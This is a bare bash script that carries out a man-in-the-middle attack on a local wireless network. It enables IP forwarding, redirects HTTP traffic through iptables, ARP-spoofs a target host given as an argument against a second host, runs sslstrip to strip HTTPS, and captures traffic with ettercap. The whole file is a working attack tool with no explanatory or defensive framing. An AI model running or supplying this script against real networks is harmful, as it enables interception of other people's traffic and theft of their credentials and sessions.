#! /bin/bash

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1024
arpspoof -i wlan0 -t $1 $2 &> /dev/null&
sslstrip -l 1024&
ettercap -Tq -i wlan0
